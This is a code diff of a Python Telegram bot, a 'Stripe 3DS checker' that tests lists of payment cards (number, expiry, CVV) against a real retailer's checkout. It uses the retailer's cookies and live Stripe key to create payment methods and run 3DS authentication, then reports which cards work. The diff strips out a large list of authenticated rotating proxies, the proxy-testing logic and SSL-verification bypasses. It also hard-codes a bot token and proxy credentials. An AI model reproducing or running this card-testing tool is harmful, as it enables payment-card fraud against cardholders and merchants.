@@ -19,115 +19,6 @@ logger = logging.getLogger(__name__)
 
 BOT_TOKEN = "8166484030:AAEcpDe4EIoSRMCFKXQq33scCSiRaEfzAWU"
 ADMIN_IDS = [5895491379, 844663875]
-
-# قائمة البروكسيات HTTP
-PROXIES_LIST = [
-"82.22.210.250:8092:bxnvwevk:utgavp02z833",
-"82.22.210.38:7880:bxnvwevk:utgavp02z833",
-"82.27.233.165:7506:bxnvwevk:utgavp02z833",
-"82.21.224.60:6416:bxnvwevk:utgavp02z833",
-"23.27.138.14:6115:bxnvwevk:utgavp02z833",
-"82.29.226.248:7590:bxnvwevk:utgavp02z833",
-"82.27.214.147:6489:bxnvwevk:utgavp02z833",
-"82.24.225.69:7910:bxnvwevk:utgavp02z833",
-"82.22.220.96:5451:bxnvwevk:utgavp02z833",
-"82.24.225.102:7943:bxnvwevk:utgavp02z833",
-"82.29.229.110:6465:bxnvwevk:utgavp02z833",
-"82.27.214.148:6490:bxnvwevk:utgavp02z833",
-"82.25.216.23:6865:bxnvwevk:utgavp02z833",
-"82.29.225.254:6109:bxnvwevk:utgavp02z833",
-"82.29.229.247:6602:bxnvwevk:utgavp02z833",
-"23.27.184.170:5771:bxnvwevk:utgavp02z833",
-"82.22.217.159:5501:bxnvwevk:utgavp02z833",
-"23.27.138.123:6224:bxnvwevk:utgavp02z833",
-"82.29.229.89:6444:bxnvwevk:utgavp02z833",
-"82.26.221.23:5364:bxnvwevk:utgavp02z833",
-"23.27.138.182:6283:bxnvwevk:utgavp02z833",
-"82.21.224.15:6371:bxnvwevk:utgavp02z833",
-"82.21.224.28:6384:bxnvwevk:utgavp02z833",
-"82.24.224.180:5536:bxnvwevk:utgavp02z833",
-"46.203.159.2:6603:bxnvwevk:utgavp02z833",
-"82.29.230.235:7076:bxnvwevk:utgavp02z833",
-"82.29.225.110:5965:bxnvwevk:utgavp02z833",
-"82.22.220.189:5544:bxnvwevk:utgavp02z833",
-"82.29.226.217:7559:bxnvwevk:utgavp02z833",
-"23.27.184.137:5738:bxnvwevk:utgavp02z833",
-"46.203.159.74:6675:bxnvwevk:utgavp02z833",
-"82.24.224.118:5474:bxnvwevk:utgavp02z833",
-"82.24.224.230:5586:bxnvwevk:utgavp02z833",
-"82.21.224.181:6537:bxnvwevk:utgavp02z833",
-"82.27.233.34:7375:bxnvwevk:utgavp02z833",
-"82.22.210.159:8001:bxnvwevk:utgavp02z833",
-"82.29.226.98:7440:bxnvwevk:utgavp02z833",
-"82.25.216.244:7086:bxnvwevk:utgavp02z833",
-"82.29.229.87:6442:bxnvwevk:utgavp02z833",
-"66.63.180.28:5552:bxnvwevk:utgavp02z833",
-"82.24.224.25:5381:bxnvwevk:utgavp02z833",
-"82.29.230.129:6970:bxnvwevk:utgavp02z833",
-"82.29.225.209:6064:bxnvwevk:utgavp02z833",
-"82.27.214.153:6495:bxnvwevk:utgavp02z833",
-"82.21.224.34:6390:bxnvwevk:utgavp02z833",
-"82.29.225.30:5885:bxnvwevk:utgavp02z833",
-"82.25.216.18:6860:bxnvwevk:utgavp02z833",
-"82.22.210.100:7942:bxnvwevk:utgavp02z833",
-"82.29.229.145:6500:bxnvwevk:utgavp02z833",
-"82.27.214.130:6472:bxnvwevk:utgavp02z833",
-"23.27.138.188:6289:bxnvwevk:utgavp02z833",
-"23.27.138.16:6117:bxnvwevk:utgavp02z833",
-"23.27.184.135:5736:bxnvwevk:utgavp02z833",
-"82.21.224.172:6528:bxnvwevk:utgavp02z833",
-"82.22.210.121:7963:bxnvwevk:utgavp02z833",
-"82.27.233.38:7379:bxnvwevk:utgavp02z833",
-"82.27.214.221:6563:bxnvwevk:utgavp02z833",
-"66.63.180.33:5557:bxnvwevk:utgavp02z833",
-"82.26.221.125:5466:bxnvwevk:utgavp02z833",
-"82.24.224.129:5485:bxnvwevk:utgavp02z833",
-"82.24.225.132:7973:bxnvwevk:utgavp02z833",
-"46.203.159.78:6679:bxnvwevk:utgavp02z833",
-"82.22.217.218:5560:bxnvwevk:utgavp02z833",
-"82.22.210.139:7981:bxnvwevk:utgavp02z833",
-"46.203.159.108:6709:bxnvwevk:utgavp02z833",
-"82.22.210.243:8085:bxnvwevk:utgavp02z833",
-"82.21.224.238:6594:bxnvwevk:utgavp02z833",
-"23.27.184.115:5716:bxnvwevk:utgavp02z833",
-"82.29.230.47:6888:bxnvwevk:utgavp02z833",
-"82.25.216.78:6920:bxnvwevk:utgavp02z833",
-"82.22.220.8:5363:bxnvwevk:utgavp02z833",
-"46.203.159.54:6655:bxnvwevk:utgavp02z833",
-"23.27.184.212:5813:bxnvwevk:utgavp02z833",
-"82.21.224.125:6481:bxnvwevk:utgavp02z833",
-"82.24.224.3:5359:bxnvwevk:utgavp02z833",
-"82.25.216.136:6978:bxnvwevk:utgavp02z833",
-"82.22.210.106:7948:bxnvwevk:utgavp02z833",
-"23.27.138.92:6193:bxnvwevk:utgavp02z833",
-"82.24.225.59:7900:bxnvwevk:utgavp02z833",
-"82.26.221.28:5369:bxnvwevk:utgavp02z833",
-"82.21.224.185:6541:bxnvwevk:utgavp02z833",
-"82.22.217.56:5398:bxnvwevk:utgavp02z833",
-"82.22.217.161:5503:bxnvwevk:utgavp02z833",
-"82.25.216.251:7093:bxnvwevk:utgavp02z833",
-"82.24.225.120:7961:bxnvwevk:utgavp02z833",
-"82.29.225.59:5914:bxnvwevk:utgavp02z833",
-"66.63.180.144:5668:bxnvwevk:utgavp02z833",
-"82.29.230.63:6904:bxnvwevk:utgavp02z833",
-"82.29.226.31:7373:bxnvwevk:utgavp02z833",
-"82.22.217.144:5486:bxnvwevk:utgavp02z833",
-"82.26.221.219:5560:bxnvwevk:utgavp02z833",
-"82.24.225.240:8081:bxnvwevk:utgavp02z833",
-"46.203.159.88:6689:bxnvwevk:utgavp02z833",
-"82.21.224.114:6470:bxnvwevk:utgavp02z833",
-"82.22.220.133:5488:bxnvwevk:utgavp02z833",
-"82.24.225.40:7881:bxnvwevk:utgavp02z833",
-"82.24.224.72:5428:bxnvwevk:utgavp02z833",
-"23.27.138.119:6220:bxnvwevk:utgavp02z833",
-"82.26.221.184:5525:bxnvwevk:utgavp02z833",
-"82.29.230.213:7054:bxnvwevk:utgavp02z833",
-]
-
-# متغيرات للبروكسي
-WORKING_PROXIES = []
-FAILED_PROXIES = []
-
 CART_ID = ""
 PID_FILE = "/tmp/stripe_bot.pid"
 
@@ -191,123 +82,21 @@ COOKIES = {
     'twk_uuid_62308ea51ffac05b1d7eb157': '%7B%22uuid%22%3A%221.AGJiGUpszpgFyK1fuLzv7ux73zcIxiPU5UywW1HN5uhgsjjnWh4i9F0OMR4T9BhpDPR4USYpzwLAzPRNrpLIjIpoKvc0t7P14AaYhdeCxg6BfbbW1XjgRdrynUXBNBBP%22%2C%22version%22%3A3%2C%22domain%22%3A%22ironmongeryworld.com%22%2C%22ts%22%3A1763018849856%7D',
 }
 
-def parse_proxy(proxy_string):
-    """تحويل البروكسي من صيغة ip:port:user:pass إلى dict"""
-    try:
-        parts = proxy_string.strip().split(':')
-        if len(parts) != 4:
-            return None
-        
-        ip, port, username, password = parts
-        
-        # صيغة HTTP مع Authentication
-        proxy_url = f'http://{username}:{password}@{ip}:{port}'
-        proxy_dict = {
-            'http': proxy_url,
-            'https': proxy_url
-        }
-        
-        return {
-            'proxies': proxy_dict,
-            'string': proxy_string,
-            'ip': ip,
-            'port': port,
-            'username': username
-        }
-    except Exception as e:
-        logger.error(f"❌ Parse proxy error: {e}")
-        return None
-
-def get_random_proxy():
-    """اختيار بروكسي عشوائي من القائمة"""
-    if not PROXIES_LIST:
-        return None
-    
-    # إذا كان هناك بروكسيات شغالة، استخدمها أولاً
-    if WORKING_PROXIES:
-        proxy_string = random.choice(WORKING_PROXIES)
-    else:
-        proxy_string = random.choice(PROXIES_LIST)
-    
-    return parse_proxy(proxy_string)
-
-def test_proxy(proxy_data, timeout=10):
-    """اختبار البروكسي للتأكد من عمله"""
-    try:
-        test_url = "https://api.stripe.com"
-        response = requests.get(
-            test_url,
-            proxies=proxy_data['proxies'],
-            timeout=timeout,
-            headers={'User-Agent': 'Mozilla/5.0'},
-            verify=False  # تجاهل SSL verification للاختبار
-        )
-        
-        if response.status_code in [200, 401, 403]:
-            if proxy_data['string'] not in WORKING_PROXIES:
-                WORKING_PROXIES.append(proxy_data['string'])
-            if proxy_data['string'] in FAILED_PROXIES:
-                FAILED_PROXIES.remove(proxy_data['string'])
-            logger.info(f"✅ Proxy OK: {proxy_data['ip']}:{proxy_data['port']}")
-            return True
-        
-        return False
-    except Exception as e:
-        logger.warning(f"⚠️ Proxy test failed: {proxy_data['ip']}:{proxy_data['port']} - {str(e)[:50]}")
-        if proxy_data['string'] not in FAILED_PROXIES:
-            FAILED_PROXIES.append(proxy_data['string'])
-        if proxy_data['string'] in WORKING_PROXIES:
-            WORKING_PROXIES.remove(proxy_data['string'])
-        return False
-
-def get_working_proxy(max_attempts=3):
-    """الحصول على بروكسي شغال مع إعادة المحاولة"""
-    for attempt in range(max_attempts):
-        proxy_data = get_random_proxy()
-        if not proxy_data:
-            logger.error("❌ No proxy available")
-            return None
-        
-        logger.info(f"🔄 Testing proxy {attempt + 1}/{max_attempts}: {proxy_data['ip']}:{proxy_data['port']}")
-        
-        if test_proxy(proxy_data):
-            return proxy_data
-        
-        time.sleep(1)
-    
-    logger.error("❌ No working proxy found after all attempts")
-    return None
-
 def generate_random_email():
     domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
     random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     return f"{random_string}@{random.choice(domains)}"
 
-def get_quote_id_smart(product_id=16124, qty=1, cookies=None, proxy_data=None):
+def get_quote_id_smart(product_id=16124, qty=1, cookies=None):
     global CART_ID
     if cookies is None:
         cookies = COOKIES
-    
-    if proxy_data is None:
-        proxy_data = get_working_proxy()
-        if not proxy_data:
-            logger.error("❌ No working proxy for cart")
-            return None
     
     try:
         headers = {'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'}
         params = {'sections': 'cart', 'force_new_section_timestamp': 'true', '_': str(int(time.time() * 1000))}
         
-        r = requests.get(
-            'https://www.ironmongeryworld.com/customer/section/load/',
-            params=params,
-            cookies=cookies,
-            headers=headers,
-            proxies=proxy_data['proxies'],
-            timeout=15,
-            verify=False
-        )
-        
+        r = requests.get('https://www.ironmongeryworld.com/customer/section/load/', params=params, cookies=cookies, headers=headers, timeout=15)
         if r.status_code != 200:
             return None
         
@@ -319,41 +108,22 @@ def get_quote_id_smart(product_id=16124, qty=1, cookies=None, proxy_data=None):
             headers_add = {'Accept': 'text/html,application/xhtml+xml', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.ironmongeryworld.com', 'User-Agent': 'Mozilla/5.0'}
             data_add = {'product': str(product_id), 'form_key': cookies.get('form_key'), 'qty': str(qty)}
             
-            r_add = requests.post(
-                f'https://www.ironmongeryworld.com/checkout/cart/add/product/{product_id}/',
-                cookies=cookies,
-                headers=headers_add,
-                data=data_add,
-                proxies=proxy_data['proxies'],
-                allow_redirects=True,
-                timeout=15,
-                verify=False
-            )
-            
+            r_add = requests.post(f'https://www.ironmongeryworld.com/checkout/cart/add/product/{product_id}/', cookies=cookies, headers=headers_add, data=data_add, allow_redirects=True, timeout=15)
             if r_add.status_code not in [200, 302]:
                 return None
             
             time.sleep(2)
-            r = requests.get(
-                'https://www.ironmongeryworld.com/customer/section/load/',
-                params=params,
-                cookies=cookies,
-                headers=headers,
-                proxies=proxy_data['proxies'],
-                timeout=15,
-                verify=False
-            )
+            r = requests.get('https://www.ironmongeryworld.com/customer/section/load/', params=params, cookies=cookies, headers=headers, timeout=15)
             data = r.json()
             cart = data.get('cart', {})
         
         quote_id = cart.get('mpquickcart', {}).get('quoteId')
         if quote_id:
             CART_ID = quote_id
-            logger.info(f"✅ Cart via proxy: {proxy_data['ip']}")
             return quote_id
         return None
     except Exception as e:
-        logger.error(f"Cart error with proxy: {e}")
+        logger.error(f"Cart error: {e}")
         return None
 
 stats = {
@@ -361,32 +131,16 @@ stats = {
     'not_auth': 0, 'unavailable': 0, 'declined': 0, 'rejected': 0, 'errors': 0,
     'cart_refreshed': 0, 'cart_refresh_failed': 0, 'start_time': None, 'is_running': False,
     'dashboard_message_id': None, 'chat_id': None, 'current_card': '', 'last_response': 'Waiting...',
-    'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': [],
-    'proxy_success': 0, 'proxy_failed': 0
+    'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': []
 }
-
-# تعطيل تحذيرات SSL
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class StripeChecker:
     def __init__(self):
         self.session = requests.Session()
         self.headers = {'accept': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-        self.current_proxy = None
         
     def check(self, card_number, exp_month, exp_year, cvv, retry_count=0, max_retries=3):
         global CART_ID
-        
-        proxy_data = get_working_proxy()
-        if not proxy_data:
-            logger.error("❌ No working proxy available")
-            stats['proxy_failed'] += 1
-            return 'ERROR', 'No proxy'
-        
-        self.current_proxy = proxy_data
-        logger.info(f"🌐 Using proxy: {proxy_data['ip']}:{proxy_data['port']}")
-        stats['proxy_success'] += 1
         
         try:
             random_email = generate_random_email()
@@ -400,16 +154,12 @@ class StripeChecker:
             
             data = f'billing_details[address][state]=London&billing_details[address][postal_code]=SW1A+1AA&billing_details[address][country]=GB&billing_details[address][city]=London&billing_details[address][line1]=111+North+Street&billing_details[email]={random_email}&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={clean_card}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&pasted_fields=number&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
             
-            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy_data['proxies'], timeout=25, verify=False)
+            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=25)
             
             logger.info(f"✅ PM Status: {r.status_code}")
             
             if r.status_code != 200:
                 logger.error(f"❌ PM Response: {r.text[:200]}")
-                if retry_count < max_retries:
-                    logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                    time.sleep(2)
-                    return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                 return 'DECLINED', 'Card declined'
             
             pm = r.json()
@@ -426,7 +176,7 @@ class StripeChecker:
             
             try:
                 estimate_payload = {'address': {'country_id': 'GB', 'postcode': 'SW1A 1AA', 'region': 'London', 'region_id': 0}}
-                r_estimate = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods', headers=headers, json=estimate_payload, proxies=proxy_data['proxies'], timeout=25, verify=False)
+                r_estimate = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods', headers=headers, json=estimate_payload, timeout=25)
                 
                 carrier_code = 'matrixrate'
                 method_code = 'matrixrate_1165'
@@ -456,12 +206,12 @@ class StripeChecker:
             }
             
             try:
-                r_shipping = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information', headers=headers, json=shipping_payload, proxies=proxy_data['proxies'], timeout=25, verify=False)
+                r_shipping = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information', headers=headers, json=shipping_payload, timeout=25)
                 logger.info(f"✅ Shipping Status: {r_shipping.status_code}")
                 
                 if r_shipping.status_code == 404 and retry_count < max_retries:
                     logger.warning("⚠️ Cart expired, refreshing...")
-                    new_cart_id = get_quote_id_smart(proxy_data=proxy_data)
+                    new_cart_id = get_quote_id_smart()
                     if new_cart_id:
                         stats['cart_refreshed'] += 1
                         time.sleep(2)
@@ -469,10 +219,6 @@ class StripeChecker:
                     return 'ERROR', 'Cart expired'
             except Exception as e:
                 logger.warning(f"⚠️ Shipping error: {e}")
-                if retry_count < max_retries:
-                    logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                    time.sleep(2)
-                    return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
             
             payload = {
                 'cartId': CART_ID,
@@ -481,7 +227,7 @@ class StripeChecker:
                 'paymentMethod': {'method': 'stripe_payments', 'additional_data': {'payment_method': pm_id}}
             }
             
-            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload, proxies=proxy_data['proxies'], timeout=25, verify=False)
+            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload, timeout=25)
             
             logger.info(f"✅ PI Status: {r.status_code}")
             logger.info(f"📄 PI Response: {r.text[:300]}")
@@ -490,17 +236,13 @@ class StripeChecker:
                 error_text = r.text[:300]
                 if any(k in error_text.lower() for k in ['no such entity', 'not found', 'cart', 'quote']) and retry_count < max_retries:
                     logger.warning("⚠️ Cart issue, refreshing...")
-                    new_cart_id = get_quote_id_smart(proxy_data=proxy_data)
+                    new_cart_id = get_quote_id_smart()
                     if new_cart_id:
                         stats['cart_refreshed'] += 1
                         time.sleep(2)
                         return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                     stats['cart_refresh_failed'] += 1
                     return 'ERROR', 'Cart refresh failed'
-                if retry_count < max_retries:
-                    logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                    time.sleep(2)
-                    return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                 return 'DECLINED', 'Payment failed'
             
             res = r.json()
@@ -537,16 +279,12 @@ class StripeChecker:
             
             params = {'is_stripe_sdk': 'false', 'client_secret': client_secret, 'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X', '_stripe_version': '2020-03-02'}
             
-            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}', params=params, headers=headers, proxies=proxy_data['proxies'], timeout=25, verify=False)
+            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}', params=params, headers=headers, timeout=25)
             
             logger.info(f"✅ Fetch PI Status: {r.status_code}")
             
             if r.status_code != 200:
                 logger.error(f"❌ Fetch PI failed: {r.text[:200]}")
-                if retry_count < max_retries:
-                    logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                    time.sleep(2)
-                    return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                 return 'DECLINED', 'Fetch failed'
             
             pi = r.json()
@@ -561,7 +299,7 @@ class StripeChecker:
                 elif pi_status == 'requires_confirmation':
                     logger.info("🔄 Confirming PI...")
                     data = f'payment_method={pm_id}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
-                    r = self.session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, proxies=proxy_data['proxies'], timeout=25, verify=False)
+                    r = self.session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, timeout=25)
                     if r.status_code == 200:
                         pi = r.json()
                         if pi.get('status') == 'succeeded':
@@ -607,17 +345,13 @@ class StripeChecker:
             
             logger.info("🔐 Calling 3DS authenticate...")
             
-            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_3ds, data=data, proxies=proxy_data['proxies'], timeout=25, verify=False)
+            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_3ds, data=data, timeout=25)
             
             logger.info(f"✅ 3DS Auth Status: {r.status_code}")
             logger.info(f"📄 3DS Response: {r.text[:500]}")
             
             if r.status_code != 200:
                 logger.error(f"❌ 3DS Auth failed: {r.text[:200]}")
-                if retry_count < max_retries:
-                    logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                    time.sleep(2)
-                    return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                 return 'DECLINED', '3DS failed'
             
             auth = r.json()
@@ -641,7 +375,7 @@ class StripeChecker:
             
             if trans_status in status_map:
                 result = status_map[trans_status]
-                logger.info(f"✅ Final: {result[0]} - {result[1]} via {proxy_data['ip']}")
+                logger.info(f"✅ Final: {result[0]} - {result[1]}")
                 return result
             
             logger.error(f"❌ Unknown transStatus: {trans_status}")
@@ -649,37 +383,14 @@ class StripeChecker:
             
         except requests.exceptions.Timeout:
             logger.error("⏱️ Timeout")
-            stats['proxy_failed'] += 1
-            if retry_count < max_retries:
-                logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                time.sleep(2)
-                return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
             return 'ERROR', 'Timeout'
         except requests.exceptions.ConnectionError:
             logger.error("🌐 Connection error")
-            stats['proxy_failed'] += 1
-            if retry_count < max_retries:
-                logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                time.sleep(2)
-                return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
             return 'ERROR', 'Connection failed'
-        except requests.exceptions.ProxyError:
-            logger.error("🌐 Proxy error")
-            stats['proxy_failed'] += 1
-            if retry_count < max_retries:
-                logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                time.sleep(2)
-                return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
-            return 'ERROR', 'Proxy failed'
         except Exception as e:
             logger.error(f"💥 Exception: {e}")
             import traceback
             logger.error(traceback.format_exc())
-            stats['proxy_failed'] += 1
-            if retry_count < max_retries:
-                logger.warning(f"🔄 Retrying with new proxy... ({retry_count + 1}/{max_retries})")
-                time.sleep(2)
-                return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
             return 'ERROR', str(e)[:50]
 
 async def send_result(bot_app, card, status_type, message):
@@ -779,7 +490,6 @@ def create_dashboard_keyboard():
         [InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"), InlineKeyboardButton(f"❌ R: {stats['rejected']}", callback_data="rejected")],
         [InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"), InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")],
         [InlineKeyboardButton(f"🔄 Cart OK: {stats['cart_refreshed']}", callback_data="cart_refresh"), InlineKeyboardButton(f"❌ Cart Failed: {stats['cart_refresh_failed']}", callback_data="cart_failed")],
-        [InlineKeyboardButton(f"🌐 Proxy OK: {stats['proxy_success']}", callback_data="proxy_ok"), InlineKeyboardButton(f"❌ Proxy Failed: {stats['proxy_failed']}", callback_data="proxy_fail")],
         [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")]
     ]
     
@@ -790,14 +500,13 @@ def create_dashboard_keyboard():
         keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
     
     keyboard.append([InlineKeyboardButton(f"🛒 Cart: {CART_ID[:15]}...", callback_data="cart_info")])
-    keyboard.append([InlineKeyboardButton(f"🌐 Working Proxies: {len(WORKING_PROXIES)}/{len(PROXIES_LIST)}", callback_data="proxy_info")])
     
     return InlineKeyboardMarkup(keyboard)
 
 async def update_dashboard(bot_app):
     if stats['dashboard_message_id'] and stats['chat_id']:
         try:
-            await bot_app.bot.edit_message_text(chat_id=stats['chat_id'], message_id=stats['dashboard_message_id'], text="📊 **STRIPE 3DS CHECKER WITH PROXY**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
+            await bot_app.bot.edit_message_text(chat_id=stats['chat_id'], message_id=stats['dashboard_message_id'], text="📊 **STRIPE 3DS CHECKER**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
         except:
             pass
 
@@ -824,9 +533,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Unauthorized")
         return
     
-    proxy_status = f"🌐 **Proxies:** {len(PROXIES_LIST)} total\n✅ Working: {len(WORKING_PROXIES)}\n❌ Failed: {len(FAILED_PROXIES)}"
-    
-    await update.message.reply_text(f"📊 **STRIPE 3DS CHECKER WITH PROXY**\n\n{proxy_status}\n\nSend .txt file with cards\nFormat: `number|month|year|cvv`\n\n**Responses:**\n✅ Y - Authenticated\n⚠️ C - Challenge\n🔵 A - Attempted\n❌ N - Not Auth\n🔴 U - Unavailable\n❌ R - Rejected\n\n**Features:**\n🌐 Auto proxy rotation\n🔄 Auto retry on failure\n✅Proxy health check", parse_mode='Markdown')
+    await update.message.reply_text("📊 **STRIPE 3DS CHECKER**\n\nSend .txt file with cards\nFormat: `number|month|year|cvv`\n\n**Responses:**\n✅ Y - Authenticated\n⚠️ C - Challenge\n🔵 A - Attempted\n❌ N - Not Auth\n🔴 U - Unavailable\n❌ R - Rejected", parse_mode='Markdown')
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
@@ -837,27 +544,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Check in progress!")
         return
     
-    await update.message.reply_text("🌐 Testing proxies...")
-    
-    working_count = 0
-    for proxy_string in PROXIES_LIST:
-        proxy_data = parse_proxy(proxy_string)
-        if proxy_data and test_proxy(proxy_data, timeout=8):
-            working_count += 1
-    
-    if working_count == 0:
-        await update.message.reply_text("❌ No working proxies found! Please check your proxy list.")
-        return
-    
-    await update.message.reply_text(f"✅ Proxies ready!\n🌐 Working: {working_count}/{len(PROXIES_LIST)}")
-    
     await update.message.reply_text("🔍 Verifying cart...")
     
     initial_cart = get_quote_id_smart()
     if initial_cart:
         await update.message.reply_text(f"✅ Cart ready!\n🛒 `{initial_cart}`", parse_mode='Markdown')
     else:
-        await update.message.reply_text("⚠️ Cart warning - will retry during check")
+        await update.message.reply_text("⚠️ Cart warning")
     
     file = await update.message.document.get_file()
     file_content = await file.download_as_bytearray()
@@ -868,14 +561,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'not_auth': 0, 'unavailable': 0, 'declined': 0, 'rejected': 0, 'errors': 0,
         'cart_refreshed': 0, 'cart_refresh_failed': 0, 'current_card': '', 'last_response': 'Starting...',
         'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': [],
-        'proxy_success': 0, 'proxy_failed': 0,
         'start_time': datetime.now(), 'is_running': True, 'chat_id': update.effective_chat.id
     })
     
-    dashboard_msg = await update.message.reply_text(text="📊 **STRIPE 3DS CHECKER WITH PROXY**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
+    dashboard_msg = await update.message.reply_text(text="📊 **STRIPE 3DS CHECKER**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
     stats['dashboard_message_id'] = dashboard_msg.message_id
     
-    await update.message.reply_text(f"✅ Started!\n📊 Total: {len(cards)}\n🛒 Cart: `{CART_ID[:20]}...`\n🌐 Proxies: {len(WORKING_PROXIES)} ready", parse_mode='Markdown')
+    await update.message.reply_text(f"✅ Started!\n📊 Total: {len(cards)}\n🛒 Cart: `{CART_ID[:20]}...`", parse_mode='Markdown')
     
     asyncio.create_task(process_cards(cards, context.application))
 
@@ -905,12 +597,12 @@ async def process_cards(cards, bot_app):
     stats['last_response'] = 'Completed ✅'
     await update_dashboard(bot_app)
     
-    summary = f"✅ **Completed!**\n\n📊 Total: {stats['total']}\n✅ Y: {stats['authenticated']}\n⚠️ C: {stats['challenge']}\n🔵 A: {stats['attempted']}\n❌ N: {stats['not_auth']}\n🔴 U: {stats['unavailable']}\n❌ R: {stats['rejected']}\n❌ Declined: {stats['declined']}\n⚠️ Errors: {stats['errors']}\n\n🔄 Cart OK: {stats['cart_refreshed']}\n❌ Cart Failed: {stats['cart_refresh_failed']}\n\n🌐 Proxy OK: {stats['proxy_success']}\n❌ Proxy Failed: {stats['proxy_failed']}\n\n📁 Sending files..."
+    summary = f"✅ **Completed!**\n\n📊 Total: {stats['total']}\n✅ Y: {stats['authenticated']}\n⚠️ C: {stats['challenge']}\n🔵 A: {stats['attempted']}\n❌ N: {stats['not_auth']}\n🔴 U: {stats['unavailable']}\n❌ R: {stats['rejected']}\n❌ Declined: {stats['declined']}\n⚠️ Errors: {stats['errors']}\n\n🔄 Cart OK: {stats['cart_refreshed']}\n❌ Cart Failed: {stats['cart_refresh_failed']}\n\n📁 Sending files..."
     
     await bot_app.bot.send_message(chat_id=stats['chat_id'], text=summary, parse_mode='Markdown')
     await send_final_files(bot_app)
     
-    final = f"🎉 **Done!**\n\n🔄 Cart refreshes: {stats['cart_refreshed']}\n❌ Cart failures: {stats['cart_refresh_failed']}\n🛒 Final Cart: `{CART_ID}`\n\n🌐 Proxy Stats:\n✅ Success: {stats['proxy_success']}\n❌ Failed: {stats['proxy_failed']}\n🔄 Working: {len(WORKING_PROXIES)}/{len(PROXIES_LIST)}\n\n✅ Stripe 3DS with Proxy Rotation"
